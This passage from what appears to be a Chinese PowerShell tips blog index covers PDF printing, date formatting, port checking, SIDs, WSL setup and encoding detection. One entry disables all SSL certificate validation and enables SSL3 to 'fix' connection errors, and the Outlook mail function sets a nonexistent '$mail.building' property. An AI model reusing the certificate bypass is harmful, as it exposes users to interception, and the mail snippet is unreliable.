-Force -ErrorAction Stop $ok = $true } catch { # file is still in use, cannot move # try again } }} until ( $ok )Write-Host# show new PDF file in explorerexplorer &quot;/select,$OutPath&quot; 当运行这段代码时，将会在桌面上创建一个新的 result.pdf 文件。它包含了所有服务的列表。您可以将任何结果通过管道输出到 Out-Printer 来创建 PDF 文件。","link":"/2018/12/21/sending-powershell-results-to-pdf-part-2/"},{"title":"PowerShell 技能连载 - 将 PowerShell 结果发送到 PDF（第 3 部分）","text":"在前一个技能中我们解释了如何在 Windows 10 和 Windows Server 2016 中使用 PowerShell 来设置一个能将任何东西打印到 PDF 文件的打印机，当然，是无人值守的。要使它真的发挥作用，我们将它封装为一个名为 Out-PDFFile 的函数。任何通过管道传给这个新命令的内容都会被转换为一个 PDF 文件。 注意：要让这个函数生效，您必须按前一个技能介绍的方法先创建一个名为 PrintPDFUnattended 的打印机！ 以下是 Out-PDFFile 函数： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667function Out-PDFFile{ param ( $Path = &quot;$env:temp\\results.pdf&quot;, [Switch] $Open ) # check to see whether the PDF printer was set up correctly $printerName = &quot;PrintPDFUnattended&quot; $printer = Get-Printer -Name $printerName -ErrorAction SilentlyContinue if (!$?) { Write-Warning &quot;Printer $printerName does not exist.&quot; Write-Warning &quot;Make sure you have created this printer (see previous tips)!&quot; return } # this is the file the print driver always prints to $TempPDF = $printer.PortName # is the printer set up correctly and the port name is the output file path? if ($TempPDF -notlike '?:\\*') { Write-Warning &quot;Printer $printerName is not set up correctly.&quot; Write-Warning &quot;Make sure you have created this printer as instructed (see previous tips)!&quot; return } # make sure old print results are removed $exists = Test-Path -Path $TempPDF if ($exists) { Remove-Item -Path $TempPDF -Force } # send anything that is piped to this function to PDF $input | Out-Printer -Name $printerName # wait for the print job to be completed, then move file $ok = $false do { Start-Sleep -Milliseconds 500 Write-Host '.' -NoNewline $fileExists = Test-Path -Path $TempPDF if ($fileExists) { try { Move-Item -Path $TempPDF -Destination $Path -Force -ea Stop $ok = $true } catch { # file is still in use, cannot move # try again } } } until ( $ok ) Write-Host # open file if requested if ($Open) { Invoke-Item -Path $Path }} 现在导出结果到 PDF 文件十分简单： 123PS&gt; Get-Service | Out-PDFFile -Path $home\\desktop\\services.pdf -OpenPS&gt; Get-ComputerInfo | Out-PDFFile -Path $home\\Desktop\\computerinfo.pdf -Open 哇哦，真简单！ 请注意我们有意地创建了一个“简单函数”。通过这种方式，所有通过管道输入的数据都可以在 $Input 自动变量中见到。如果您向参数添加属性，例如要使参数成为必选的，这个函数就变成了“高级函数”，并且 $Input 就不存在了。我们将在明天解决这个问题。 psconf.eu – PowerShell Conference EU 2019 – June 4-7, Hannover Germany – visit www.psconf.eu There aren’t too many trainings around for experienced PowerShell scripters where you really still learn something new. But there’s one place you don’t want to miss: PowerShell Conference EU - with 40 renown international speakers including PowerShell team members and MVPs, plus 350 professional and creative PowerShell scripters. Registration is open at www.psconf.eu, and the full 3-track 4-days agenda becomes available soon. Once a year it’s just a smart move to come together, update know-how, learn about security and mitigations, and bring home fresh ideas and authoritative guidance. We’d sure love to see and hear from you!","link":"/2018/12/24/sending-powershell-results-to-pdf-part-3/"},{"title":"PowerShell 技能连载 - 将 PowerShell 结果发送到 PDF（第 4 部分）","text":"在前一个技能中我们将建了 Out-PDFFile 函数，能够接受任意 PowerShell 的结果数据并将它们转换为 PDF 文件——使用 Windows 10 和 Windows Server 2016 内置的打印驱动。 我们使用了一个简单的函数，用 $Input 自动变量来读取管道输入的数据，从而达到上述目的。如果您更希望使用高级函数，利用它们的必选参数等功能，我们将该工程包装成一个更优雅的高级函数，它能够在检测到未安装 PDF 打印机的情况下先安装它： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394function Out-PDFFile{ param ( [Parameter(Mandatory)] [String] $Path, [Parameter(ValueFromPipeline)] [Object] $InputObject, [Switch] $Open ) begin { # check to see whether the PDF printer was set up correctly $printerName = &quot;PrintPDFUnattended&quot; $printer = Get-Printer -Name $printerName -ErrorAction SilentlyContinue if (!$?) { $TempPDF = &quot;$env:temp\\tempPDFResult.pdf&quot; $port = Get-PrinterPort -Name $TempPDF -ErrorAction SilentlyContinue if ($port -eq $null) { # create printer port Add-PrinterPort -Name $TempPDF } # add printer Add-Printer -DriverName &quot;Microsoft Print to PDF&quot; -Name $printerName -PortName $TempPDF } else { # this is the file the print driver always prints to $TempPDF = $printer.PortName # is the port name is the output file path? if ($TempPDF -notlike '?:\\*') { throw &quot;Printer $printerName is not set up correctly. Remove the printer, and try again.&quot; } } # make sure old print results are removed $exists = Test-Path -Path $TempPDF if ($exists) { Remove-Item -Path $TempPDF -Force } # create an empty arraylist that takes the piped results [Collections.ArrayList]$collector = @() } process { $null = $collector.Add($InputObject) } end { # send anything that is piped to this function to PDF $collector | Out-Printer -Name $printerName # wait for the print job to be completed, then move file $ok = $false do { Start-Sleep -Milliseconds 500 Write-Host '.' -NoNewline $fileExists = Test-Path -Path $TempPDF if ($fileExists) { try { Move-Item -Path $TempPDF -Destination $Path -Force -ea Stop $ok = $true } catch { # file is still in use, cannot move # try again } } } until ( $ok ) Write-Host # open file if requested if ($Open) { Invoke-Item -Path $Path } }} 假设您使用的是 Windows 10 或 Windows 2016，并且 “Microsoft Print to PDF” 打印机可用，那么您可以像这样方便地创建 PDF 文档： 123PS&gt; Get-Service | Out-PDFFile -Path $home\\desktop\\services.pdf -OpenPS&gt; Get-ComputerInfo | Out-PDFFile -Path $home\\Desktop\\computerinfo.pdf -Open 如果指定的 “PrintPDFUnattended” 打印机还未安装，该函数也会事先安装该打印机。","link":"/2018/12/25/sending-powershell-results-to-pdf-part-4/"},{"title":"PowerShell 技能连载 - 格式化日期和时间","text":"通过 Get-Date 的 -Format 参数可以方便地将日期和时间格式化为您所需的格式。您可以对当前时间使用它，也可以对外部的 DateTime 变量使用它。只需要使用日期和时间的格式化字符串就可以转换为您所需的输出格式。 以下是一些例子。例如要将当前日期暗 ISO 格式输出，请运行以下代码： 12PS&gt; Get-Date -Format 'yyyy-MM-dd HH:mm:ss'2018-12-02 11:36:37 使用现有的或从别处读取的 datetime 对象的方法是 将它传给 Get-Date 的 -Date 属性： 123456789# find out last boot time$os = Get-CimInstance -ClassName Win32_OperatingSystem$lastBoot = $os.LastBootUpTime# raw datetime output$lastBoot# formatted string outputGet-Date -Date $lastBoot -Format '&quot;Last reboot at&quot; MMM dd, yyyy &quot;at&quot; HH:mm:ss &quot;and&quot; fffff &quot;Milliseconds. 格式化字符串既可以包括日期时间的通配符，也可以包括静态文本。只需要确保用双引号将静态文本包括起来。以下是执行结果（在德语系统上）： Donnerstag, 22. November 2018 01:13:44 Last reboot at Nov 22, 2018 at 01:13:44 and 50000 Milliseconds.","link":"/2018/12/26/formatting-date-and-time/"},{"title":"PowerShell 技能连载 - 格式化日期和时间（包含区域性）","text":"在前一个技能中我们演示了 Get-Date 如何用格式化字符串将 DateTime 值转换为字符串。不过该字符串转换总是使用操作系统中的语言。这可能不是您想要的。现在我们来解决这个问题： 以下是输出 2018 圣诞前夕是周几的示例： 123$christmasEve = Get-Date -Date '2018-12-24'Get-Date -Date $christmasEve -Format '&quot;Christmas Eve in&quot; yyyy &quot;will be on&quot; dddd.' 显然这是在德文系统上做的转换，所以结果中的周几是用德文显示的： Christmas Eve in 2018 will be on Montag. 如果您的脚本需要输出不同语言的结果，例如以英语（或其他语言）的方式来输出星期几。要控制语言，您需要意识到两件事：第一，Get-Date 和 -Format 的格式化选项只是通用的 .NET 方法 ToString() 的简单封装，所以您也可以运行这段代码获得相同的结果： 123$christmasEve = Get-Date -Date '2018-12-24'$christmasEve.ToString('&quot;Christmas Eve in&quot; yyyy &quot;will be on&quot; dddd.') 第二，ToString() 方法有许多重载，其中一个能接受任何实现了 IFormatProvider 接口的对象，它们恰好包含了 “CultureInfo“ 对象： 12345678910PS&gt; $christmasEve.ToStringOverloadDefinitions-------------------string ToString()string ToString(string format)string ToString(System.IFormatProvider provider)string ToString(string format, System.IFormatProvider provider)string IFormattable.ToString(string format, System.IFormatProvider formatProvider)string IConvertible.ToString(System.IFormatProvider provider) 以下是无论在什么语言的操作系统上都以英文输出周几的解决方案： 123456$christmasEve = Get-Date -Date '2018-12-24'$culture = [CultureInfo]'en-us'$christmasEve.ToString('&quot;Christmas Eve in&quot; yyyy &quot;will be on&quot; dddd.', $culture)Christmas Eve in 2018 will be on Monday. 如果要显示其它地区的语言，例如要查看中文或泰文中“星期一”的表达： 12345678910$christmasEve = Get-Date -Date '2018-12-24'$culture = [CultureInfo]'zh'$christmasEve.ToString('&quot;Monday in Chinese: &quot; dddd.', $culture)$culture = [CultureInfo]'th'$christmasEve.ToString('&quot;Monday in Thai: &quot; dddd.', $culture)Monday in Chinese: 星期一.Monday in Thai: จันทร์.","link":"/2018/12/27/formatting-date-and-time-with-culture/"},{"title":"PowerShell 技能连载 - 查看 Windows 通用唯一识别码 (UUID)","text":"每个 Windows 的安装都有一个唯一的 UUID，您可以用它来区分机器。计算机名可能会改变，但 UUID 不会。 12PS&gt; (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID4C4C4544-004C-4710-8051-C4C04F443732 In reality, the UUID is just a GUID (Globally Unique Identifier), which comes in different formats:实际中，UUID 只是一个 GUID（全局唯一标识符），它的格式有所不同： 1234567$uuid = (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID[Guid]$guid = $uuid&quot;d&quot;,&quot;n&quot;,&quot;p&quot;,&quot;b&quot;,&quot;x&quot; | ForEach-Object { '$guid.ToString(&quot;{0}&quot;) = {1}' -f $_, $guid.ToString($_) } 以下是执行结果： $guid.ToString(&quot;d&quot;)= 4c4c4544-004c-4710-8051-c4c04f443732 $guid.ToString(&quot;n&quot;)= 4c4c4544004c47108051c4c04f443732 $guid.ToString(&quot;p&quot;)= (4c4c4544-004c-4710-8051-c4c04f443732) $guid.ToString(&quot;b&quot;)= {4c4c4544-004c-4710-8051-c4c04f443732} $guid.ToString(&quot;x&quot;)= {0x4c4c4544,0x004c,0x4710,{0x80,0x51,0xc4,0xc0,0x4f,0x44,0x37,0x32}} 如果您希望为某个想标记的东西创建一个新的 UUID（或 GUID），例如临时文件名，那么可以用 PowerShell 5 新带来的 New-Guid 命令： 12345PS&gt; New-GuidGuid----16750457-9a7e-4510-96ab-f9eef7273f3e 它实质上是在后台调用了这个 .NET 方法： 12345PS&gt; [Guid]::NewGuid()Guid---- 6cb3cb1a-b094-425b-8ccb-e74c2034884f","link":"/2018/12/28/finding-windows-universal-unique-identifier-uuid/"},{"title":"PowerShell 技能连载 - 连接文本文件","text":"假设一个脚本已经向某个文件夹写入了多个日志文件，所有文件名都为 *.log。您可能希望将它们合并为一个大文件。以下是一个简单的实践： 123456$OutPath = &quot;$env:temp\\summary.log&quot;Get-Content -Path &quot;C:\\Users\\tobwe\\Documents\\ScriptOutput\\*.log&quot; | Set-Content $OutPathInvoke-Item -Path $OutPath 然而，这个方法并不能提供充分的控制权：所有文件需要放置在同一个文件夹中，并且必须有相同的文件扩展名，而且您无法控制它们合并的顺序。 一个更多功能的方法类似这样： 12345678$OutPath = &quot;$env:temp\\summary.log&quot;Get-ChildItem -Path &quot;C:\\Users\\demouser\\Documents\\Scripts\\*.log&quot; -Recurse -File | Sort-Object -Property LastWriteTime -Descending | Get-Content | Set-Content $OutPathInvoke-Item -Path $OutPath 它利用了 Get-ChildItem 的灵活性，而且可以在读取内容之前对文件排序。通过这种方法，日志保持了顺序，并且最终的日志信息总是在日志文件的最上部。","link":"/2018/12/31/concatenating-text-files/"},{"title":"PowerShell 技能连载 - 首字母大写","text":"修饰一段文本并不太简单，如果您希望名字或者文本格式正确，并且每个单词都以大写开头，那么工作量通常很大。 有趣的是，每个 CultureInfo 对象有一个内置的 ToTitleCase() 方法，可以完成上述工作。如果您曾经将纯文本转换为全部消协，那么它也可以处理所有大写的单词： 12345$text = &quot;here is some TEXT that I would like to title-case (all words start with an uppercase letter)&quot;$textInfo = (Get-Culture).TextInfo$textInfo.ToTitleCase($text)$textInfo.ToTitleCase($text.ToLower()) 以下是执行结果： Here Is Some TEXT That I Would Like To Title-Case (All Words Start With An Upper Letter Here Is Some Text That I Would Like To Title-Case (All Words Start With An Upper Letter This method may be especially useful for list of names.这个方法对于姓名列表很有用。","link":"/2019/01/01/title-casing-strings-capital-letter-starts-each-word/"},{"title":"PowerShell 技能连载 - 通过 Outlook 发送邮件","text":"您可以用 Send-MailMessage 通过任何 SMTP 服务器放松右键。不过，如果您希望使用 Outlook 客户端，例如要访问地址簿、使用公司的 Exchange 服务器，或者将邮件保存到邮件历史中，那么可以通过这个快速方法来实现： 12345678910111213141516171819202122232425262728function Send-OutlookMail{ param ( [Parameter(Mandatory=$true)] $To, [Parameter(Mandatory=$true)] $Subject, [Parameter(Mandatory=$true)] $BodyText, [Parameter(Mandatory=$true)] $AttachmentPath ) $outlook = New-Object -ComObject Outlook.Application $mail = $outlook.CreateItem(0) $mail.Subject = $Subject $mail.to = $To $mail.BodyFormat = 1 # use 2 for HTML mails $mail.Attachments.Add([object]$AttachmentPath, 1) $mail.building = $BodyText $mail.Display($false)} 这只是一个基本的模板，您可以投入一些时间使它变得更好。例如，当前版本总是需要一个附件。在更复杂的版本中，您可以使附件变成可选的，并且支持多个附件。或者寻找一种方法发送邮件而不需要用户交互。","link":"/2019/01/02/sending-emails-via-outlook/"},{"title":"PowerShell 技能连载 - 列出网络驱动器","text":"有着许多方法可以创建网络驱动器的列表。其中一个需要调用 COM 接口。这个接口也可以通过 VBScript 调用。我们将利用它演示一个特殊的 PowerShell 技术。 要列出所有网络驱动器，只需要运行这几行代码： 12$obj = New-Object -ComObject WScript.Network$obj.EnumNetworkDrives() 结果类似这样： 123456PS&gt; $obj.EnumNetworkDrives()X:\\\\storage4\\dataZ:\\\\127.0.0.1\\c$ 这个方法对每个网络驱动器返回两个字符串：挂载的驱动器号，以及原始 URL。要将它转为有用的东西，您需要创建一个循环，每次迭代返回两个元素。 以下是一个聪明的方法来实现这个目标： 123456789101112131415$obj = New-Object -ComObject WScript.Network$result = $obj.EnumNetworkDrives()Foreach ($entry in $result){ $letter = $entry $null = $foreach.MoveNext() $path = $foreach.Current [PSCustomObject]@{ DriveLetter = $letter UNCPath = $path }} 在 foreach 循环中，有一个很少人知道的自动变量，名为 $foreach，它控制着迭代。当您调用 MoveNext() 方法时，它对整个集合迭代，移动到下一个元素。通过 Current 属性，可以读取到迭代器的当前值。 通过这种方法，循环每次处理两个元素，而不仅仅是一个。两个元素合并为一个自定义对象。结果看起来类似这样： DriveLetter UNCPath ----------- ------- X: \\\\storage4\\data Z: \\\\127.0.0.1\\c$","link":"/2019/01/03/listing-network-drives/"},{"title":"PowerShell 技能连载 - 用 ForEach 实现实时流","text":"传统的 foreach 循环是最快速的循环方式，但是它有一个严重的限制。foreach 循环不支持管道。用户只能等待整个 foreach 循环结束才能处理结果。 以下是一些演示这个情况的示例。在以下代码中，您需要等待一段很长的时间才能“看见”执行结果： 12345678$result = foreach ($item in $elements){ &quot;processing $item&quot; # simulate some work and delay Start-Sleep -Milliseconds 50}$result | Out-GridView 您无法直接通过管道输出结果。以下代码会产生语法错误： 12345678$elements = 1..100Foreach ($item in $elements){ &quot;processing $item&quot; # simulate some work and delay Start-Sleep -Milliseconds 50} | Out-GridView 可以使用 $() 语法来使用管道，但是仍然要等待循环结束并且将整个结果作为一个整体发送到管道： 12345678$elements = 1..100$(foreach ($item in $elements){ &quot;processing $item&quot; # simulate some work and delay Start-Sleep -Milliseconds 50}) | Out-GridView 一下是一个鲜为人知的技巧，向 foreach 循环增加实时流功能：只需要使用一个脚本块！ 12345678$elements = 1..100&amp; { foreach ($item in $elements){ &quot;processing $item&quot; # simulate some work and delay Start-Sleep -Milliseconds 50}} | Out-GridView 现在您可以“看到”它们处理的结果，并且享受实时流的效果。 让然，您可以一开始就不使用 foreach，而是使用 ForEach-Object 管道 cmdlet 来代替： 123456789$elements = 1..100$elements | ForEach-Object { $item = $_ &quot;processing $item&quot; # simulate some work and delay Start-Sleep -Milliseconds 50} | Out-GridView 但是，ForEach-Object 比 foreach 关键字慢得多，并且有些场景无法使用 ForEach-Object。例如，在许多数据库代码中，代码需要一次次地检测结束标记，所以无法使用 ForEach-Object。","link":"/2019/01/04/enable-real-time-streaming-with-foreach/"},{"title":"PowerShell 技能连载 - 删除日期最早的日志文件","text":"如果您正在将日志活动写入文件，可能需要清除一些东西，例如在增加一个新文件的时候总是需要删除最旧的日志文件。 以下是一个简单的实现： 123456789101112# this is the folder keeping the log files$LogFileDir = &quot;c:\\myLogFiles&quot;# find all log files...Get-ChildItem -Path $LogFileDir -Filter *.log | # sort by last change ascending # (oldest first)... Sort-Object -Property LastWriteTime | # take the first (oldest) one Select-Object -First 1 | # remove it (remove -whatif to actually delete) Remove-Item -WhatIf 如果只希望保留最新的 5 个文件，请像这样更改： 12345678910111213141516171819# this is the folder keeping the log files$LogFileDir = &quot;c:\\myLogFiles&quot;$Keep = 5# find all log files...$files = @(Get-ChildItem -Path $LogFileDir -Filter *.log)$NumberToDelete = $files.Count - $Keepif ($NumberToDelete -gt 0){ $files | # sort by last change ascending # (oldest first)... Sort-Object -Property LastWriteTime | # take the first (oldest) one Select-Object -First $NumberToDelete | # remove it (remove -whatif to actually delete) Remove-Item -WhatIf}","link":"/2019/01/07/deleting-the-oldest-log-file/"},{"title":"PowerShell 技能连载 - 解决 SSL 连接问题","text":"有些时候当您尝试连接 WEB 服务时，PowerShell 可能会弹出无法设置安全的 SSL 通道提示。 让我们来深入了解一下这个问题。以下是一段调用德国铁路系统 WEB 服务的代码。它应该返回指定城市的火车站列表： 123456789$city = &quot;Hannover&quot;$url = &quot;https://rit.bahn.de/webservices/rvabuchung?WSDL&quot;$object = New-WebServiceProxy -Uri $url -Class db -Namespace test$request = [test.SucheBahnhoefeAnfrage]::new()$request.bahnhofsname = $city$response = $object.sucheBahnhoefe($request)$response.bahnhoefe 不过，它弹出了一系列关于 SSL 连接问题的异常。通常，这些错误源于两种情况： 该 WEB 网站用于确立 SSL 连接的 SSL 证书非法、过期，或不被信任。 该 SSL 连接需要某种协议，而该协议没有启用。 要解决这些情况，只需要运行以下代码： 123456# ignore invalid SSL certificates[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}# allowing SSL protocols$AllProtocols = [Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'[Net.ServicePointManager]::SecurityProtocol = $AllProtocols 只要执行一次，对当前的 PowerShell 会话都有效。以上代码现在能够正常返回 Hannover 地区的车站信息。而且如果深入地了解该对象的模型，您甚至可以通过 PowerShell 订火车票。 name nummer ---- ------ Hannover Hbf 8000152 Hannover-Linden/Fi. 8002586 Hannover-Nordstadt 8002576 Hannover Bismarckstr 8002580 Hannover-Ledeburg 8002583 Hannover-Vinnhorst 8006089 Hannover-Leinhausen 8002585 Hannover Wiech-Allee 8002591 Hannover Ander.Misb. 8000578 Hannover Flughafen 8002589 Hannover-Kleefeld 8002584 Hannover-Bornum 8002581 Hann Münden 8006707 HannoverMesseLaatzen 8003487","link":"/2019/01/08/solving-ssl-connection-problems/"},{"title":"PowerShell 技能连载 - 重制控制台颜色","text":"在 PowerShell 控制台里很容易把控制台颜色搞乱。一个不经意的调用意外地改变了颜色值，或者脚本错误地设置了颜色，可能会导致意外的结果。要验证这种情况，请打开一个 PowerShell 控制台（不是编辑器！），并且运行这段代码： 1PS&gt; [Console]::BackgroundColor = &quot;Green&quot; 要快速地清除颜色，请运行这段代码： 1PS&gt; [Console]::ResetColor() 接着运行 Clear-Host 可以清空显示。","link":"/2019/01/09/resetting-console-colors-b/"},{"title":"PowerShell 技能连载 - 扫描端口","text":"以下是一个扫描本地或远程系统端口的一个直接的方法。您甚至可以指定一个超时值（以毫秒为单位）： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748function Get-PortInfo{ param ( [Parameter(Mandatory)] [Int] $Port, [Parameter(Mandatory)] [Int] $TimeoutMilliseconds, [String] $ComputerName = $env:COMPUTERNAME ) # try and establish a connection to port async $tcpobject = New-Object System.Net.Sockets.TcpClient $connect = $tcpobject.BeginConnect($computername,$port,$null,$null) # wait for the connection no longer than $timeoutMilliseconds $wait = $connect.AsyncWaitHandle.WaitOne($timeoutMilliseconds,$false) # return rich information $result = @{ ComputerName = $ComputerName } if(!$wait) { # timeout $tcpobject.Close() $result.Online = $false $result.Error = 'Timeout' } else { try { # try and complete the connection $null = $tcpobject.EndConnect($connect) $result.Online = $true } catch { $result.Online = $false } $tcpobject.Close() } $tcpobject.Dispose() [PSCustomObject]$result} 扫描端口现在变得十分简单： 123456789101112PS&gt; Get-PortInfo -Port 139 -TimeoutMilliseconds 1000ComputerName Online------------ ------DESKTOP-7AAMJLF TruePS&gt; Get-PortInfo -Port 139 -TimeoutMilliseconds 1000 -ComputerName storage2Error ComputerName Online----- ------------ ------Timeout storage2 False","link":"/2019/01/10/scanning-ports/"},{"title":"PowerShell 技能连载 - 当前用户的 SID","text":"以下是一行返回当前用户 SID 并且可以用于登录脚本的代码，例如： 1([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value","link":"/2019/01/11/sid-of-current-user/"},{"title":"PowerShell 技能连载 - 使用本地化的用户名和组名","text":"以下是一行返回由当前用户 SID 解析成名字的代码： 1([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Translate( [System.Security.Principal.NTAccount]).Value 您可能会反对说查询 $env:username 环境变量来完成这个目的更容易，的确是这样的。然而在许多场景将 SID 转换为名字很有用。例如，如果您必须知道某个常见账户或组的确切（本地）名字，例如本地的 Administrators 组，只需要使用语言中性的 SID 来翻译它： 123PS&gt; ([System.Security.Principal.SecurityIdentifier]'S-1-5-32-544').Translate( [System.Security.Principal.NTAccount]).ValueVORDEFINIERT\\Administratoren 类似地，以下代码总是列出本地的 Administrators，无论是什么语言的操作系统： 12345$admins = ([System.Security.Principal.SecurityIdentifier]'S-1-5-32-544').Translate( [System.Security.Principal.NTAccount]).Value$parts = $admins -split '\\\\'$groupname = $parts[-1]Get-LocalGroupMember -Group $groupname","link":"/2019/01/14/using-localized-user-and-group-names/"},{"title":"PowerShell 技能连载 - 在 Windows 10 中安装 Linux","text":"Windows 中带有适用于 Linux 的 Windows 子系统 (WSL) 功能，您可以通过它来运行各种 Linux 发型版。通过提升权限的 PowerShell 来启用 WSL： 1Enable-WindowsOptionalFeature -FeatureName Microsoft-Windows-Subsystem-Linux -Online 下一步，在 Windows 10 中打开 Microsoft Store，并且搜索 “Linux”。安装某个支持的 Linux 发行版（例如，Debian）！ 这是全部的步骤。您现在可以在 PowerShell 里或通过开始菜单打开 Debian。只需要运行 “Debian” 命令。当您首次运行时，您需要设置一个 root 账号和密码。 您也许已经知道，PowerShell 是跨平台的，并且可以运行在 Linux 上。如果您希望使用新的 Debian 环境并且测试在 Linux 上运行 PowerShell，请在 Debian 控制台中运行以下代码： 1234567sudo apt-get updatesudo apt-get install curl apt-transport-httpscurl https://packages.microsoft.com/keys/microsoft.asc | sudo apt-key add -sudo sh -c 'echo &quot;deb https://packages.microsoft.com/repos/microsoft-debian-stretch-prod stretch main&quot; &gt; /etc/apt/sources.list.d/microsoft.list'sudo apt-get updatesudo apt-get install -y powershellpwsh 下一步，从 Debian 中，运行 “pwsh“ 命令切换到 PowerShell 6。","link":"/2019/01/15/installing-linux-on-windows-10/"},{"title":"PowerShell 技能连载 - 打印 PDF 文件（第 1 部分）","text":"如要自动打印 PDF 文档，不幸的是无法使用 Out-Printer。Out-Printer 只能发送纯文本文档到打印机。 不过，请看一下代码： 1234# adjust this path to the PDF document of choice$Path = &quot;c:\\docs\\document.pdf&quot;Start-Process -FilePath $Path -Verb Print 假设您已经安装了可以打印 PDF 文档的软件，这段代码将会把文档发送到关联的程序并自动将它打印到缺省的打印机。 一些软件（例如 Acrobat Reader）执行完上述操作之后仍会驻留在内存里。可以考虑这种方法解决： 123456789# adjust this path to the PDF document of choice$Path = &quot;c:\\docs\\document.pdf&quot;# choose a delay (in seconds) for the print out to complete$PrintDelay = 10Start-Process -FilePath $Path -Verb Print -PassThru | ForEach-Object{ Start-Sleep $printDelay; $_} | Stop-Process","link":"/2019/01/16/printing-pdf-files-part-1/"},{"title":"PowerShell 技能连载 - 打印 PDF 文件（第 2 部分）","text":"在前一个技能中我们解释了如何用 PowerShell 将 PDF 文档发送到缺省的 PDF 打印机。这个通用方案对于简单场景是没问题的，但是无法让用户指定打印机。 如果使用特定的软件可以控制更多内容，因为您可以使用该软件暴露的特殊功能。 以下示例使用 Acrobat Reader 来打印到 PDF 文档。它展示了如何使用 Acrobat Reader 中的特殊选项来任意选择打印机，此外 Acrobat Reader 打印完文档将会自动关闭。 123456789101112131415161718192021222324252627282930313233343536373839404142# PDF document to print out$PDFPath = &quot;C:\\docs\\document.pdf&quot;# find Acrobat Reader$Paths = @(Resolve-Path -Path &quot;C:\\Program Files*\\Adobe\\*\\reader\\acrord32.exe&quot;)# none foundif ($Paths.Count -eq 0){ Write-Warning &quot;Acrobat Reader not installed. Cannot continue.&quot; return}# more than one found, choose one manuallyif ($Paths.Count -gt 1){$Paths = @($Paths |Out-GridView -Title 'Choose Acrobat Reader' -OutputMode Single)}$Software = $Paths[0]# does it exist?$exists = Test-Path -Path $Softwareif (!$exists){ Write-Warning &quot;Acrobat Reader not found. Cannot continue.&quot; return}# choose printer$printerName = Get-Printer | Select-Object -ExpandProperty Name | Sort-Object | Out-GridView -Title &quot;Choose Printer&quot; -OutputMode Single$printer = Get-Printer -Name $printerName$drivername= $printer.DriverName$portname=$printer.PortName$arguments='/S /T &quot;{0}&quot; &quot;{1}&quot; &quot;{2}&quot; {3}' -f $PDFPath, $printername, $drivername, $portnameStart-Process $Software -ArgumentList $arguments -Wait","link":"/2019/01/17/printing-pdf-files-part-2/"},{"title":"PowerShell 技能连载 - Retrieving Windows Product Key","text":"以下是获取当前 Windows 产品序列号的单行代码： 1(Get-WmiObject -Class &quot;SoftwareLicensingService&quot;).OA3xOriginalProductKey","link":"/2019/01/18/retrieving-windows-product-key/"},{"title":"PowerShell 技能连载 - 通过鼠标滚轮控制 PowerShell 的透明度","text":"在 Windows 10 中，当按下 CTRL+SHIFT 并滚动鼠标滚轮，就可以方便地控制控制台窗口的透明度，包括 PowerShell 控制台窗口。","link":"/2019/01/21/controlling-powershell-transparency-with-mouse-wheel/"},{"title":"PowerShell 技能连载 - 获取文本文件编码","text":"文本文件可以以不同的编码存储。需要正确地指定编码，才能正确地读取它们。这是为什么多数读取文本文件的 cmdlet 提供 -Encoding 参数（例如 Get-Content）。如果没有指定正确的编码，您可能会看到一堆乱码。 那么如何（自动地）确认某个指定的文本文件所使用的编码？以下是一个好用的函数： 1234567891011121314151617181920212223242526272829303132333435363738function Get-Encoding{ param ( [Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)] [Alias('FullName')] [string] $Path ) process { $bom = New-Object -TypeName System.Byte[](4) $file = New-Object System.IO.FileStream($Path, 'Open', 'Read') $null = $file.Read($bom,0,4) $file.Close() $file.Dispose() $enc = [Text.Encoding]::ASCII if ($bom[0] -eq 0x2b -and $bom[1] -eq 0x2f -and $bom[2] -eq 0x76) { $enc = [Text.Encoding]::UTF7 } if ($bom[0] -eq 0xff -and $bom[1] -eq 0xfe) { $enc = [Text.Encoding]::Unicode } if ($bom[0] -eq 0xfe -and $bom[1] -eq 0xff) { $enc = [Text.Encoding]::BigEndianUnicode } if ($bom[0] -eq 0x00 -and $bom[1] -eq 0x00 -and $bom[2] -eq 0xfe -and $bom[3] -eq 0xff) { $enc = [Text.Encoding]::UTF32} if ($bom[0] -eq 0xef -and $bom[1] -eq 0xbb -and $bom[2] -eq 0xbf) { $enc = [Text.Encoding]::UTF8} [PSCustomObject]@{ Encoding = $enc Path = $Path } }} 以下是一段检查您用户配置文件中所有文本文件的测试代码： 12345678910PS&gt; dir $home -Filter *.txt -Recurse | Get-EncodingEncoding Path-------- ----System.Text.UnicodeEncoding C:\\Users\\tobwe\\E006_psconfeu2019.txtSystem.Text.UnicodeEncoding C:\\Users\\tobwe\\E009_psconfeu2019.txtSystem.Text.UnicodeEncoding C:\\Users\\tobwe\\E027_psconfeu2019.txtSystem.Text.ASCIIEncoding C:\\Users\\tobwe\\.nuget\\packages\\Aspose.Words\\18.12.0\\...System.Text.ASCIIEncoding C:\\Users\\tobwe\\.vscode\\extensions\\ms-vscode.powers...System.Text.UTF8Encoding C:\\Users\\tobwe\\.vscode\\extensions\\ms-vscode.powers...","link":"/2019/01/22/get-text-file-encoding/"},{"title":"PowerShell 技能连载 - PowerShell 速查表汇编（第 1 部分）","text":"以下是一个很棒的流行的 PowerShell 速查表，完全免费并且可以直接下载： https://github.com/PrateekKumarSingh/CheatSheets/tree/master/Powershell","link":"/2019/01/23/powershell-cheat-sheet-compilation-part-1/"},{"title":"PowerShell 技能连载 - PowerShell 速查表汇编（第 2 部分）","text":"在前一个技能中我们提供了一个很棒的 PowerShell 速查表。让我们来看看 PowerShell 能够怎样下载这些速查表： 12345678910111213141516171819202122232425262728293031# enable SSL download$AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'[System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols# download page$url = &quot;https://github.com/PrateekKumarSingh/CheatSheets/tree/master/Powershell&quot;$page = Invoke-WebRequest -UseBasicParsing -Uri $url$links = $page.Links | Where-Object { $_.href -like '*.pdf' } | Select-Object -Property title, href | # turn URLs into directly downloadable absolute URLs ForEach-Object { $_.href = 'https://github.com/PrateekKumarSingh/CheatSheets/raw/master/Powershell/' + 